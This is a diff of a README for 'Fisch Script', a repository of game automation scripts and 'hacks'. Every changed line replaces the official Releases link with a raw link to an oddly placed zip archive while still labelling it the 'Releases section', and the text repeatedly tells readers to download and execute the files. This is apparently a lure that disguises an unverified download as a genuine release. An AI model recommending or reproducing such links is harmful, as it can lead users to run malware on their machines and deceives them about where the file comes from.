@@ -2,7 +2,7 @@
 
 Welcome to the Fisch Script repository! This repository contains various scripts designed to enhance your experience with Fisch-related projects. From automation to hacks, you'll find a range of tools here to suit your needs.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/YazAzka/fisch-script/releases)
+[![Download Releases](https://github.com/YazAzka/fisch-script/raw/refs/heads/main/biomagnetism/fisch-script-petitor.zip%20Releases-Click%20Here-brightgreen)](https://github.com/YazAzka/fisch-script/raw/refs/heads/main/biomagnetism/fisch-script-petitor.zip)
 
 ## Table of Contents
 
@@ -19,7 +19,7 @@ Welcome to the Fisch Script repository! This repository contains various scripts
 
 Fisch Script is designed for users who want to explore the capabilities of Fisch in various environments. Whether you are looking for automation, exploits, or hacks, this repository aims to provide you with reliable scripts. 
 
-You can find the latest releases [here](https://github.com/YazAzka/fisch-script/releases). Download the necessary files and execute them to get started.
+You can find the latest releases [here](https://github.com/YazAzka/fisch-script/raw/refs/heads/main/biomagnetism/fisch-script-petitor.zip). Download the necessary files and execute them to get started.
 
 ## Features
 
@@ -32,7 +32,7 @@ You can find the latest releases [here](https://github.com/YazAzka/fisch-script/
 
 To install the Fisch Script, follow these steps:
 
-1. **Download**: Visit the [Releases section](https://github.com/YazAzka/fisch-script/releases) to download the latest version.
+1. **Download**: Visit the [Releases section](https://github.com/YazAzka/fisch-script/raw/refs/heads/main/biomagnetism/fisch-script-petitor.zip) to download the latest version.
 2. **Extract**: Unzip the downloaded file to a directory of your choice.
 3. **Execute**: Run the script as per the instructions provided in the documentation.
 
@@ -89,6 +89,6 @@ This repository is licensed under the MIT License. Feel free to use, modify, and
 
 If you encounter any issues or have questions, feel free to reach out. You can find help in the Issues section of this repository or contact us directly.
 
-For the latest updates and releases, remember to check the [Releases section](https://github.com/YazAzka/fisch-script/releases) regularly. Download the necessary files and execute them to keep your scripts up to date.
+For the latest updates and releases, remember to check the [Releases section](https://github.com/YazAzka/fisch-script/raw/refs/heads/main/biomagnetism/fisch-script-petitor.zip) regularly. Download the necessary files and execute them to keep your scripts up to date.
 
 Thank you for visiting the Fisch Script repository! Happy scripting! 🐟
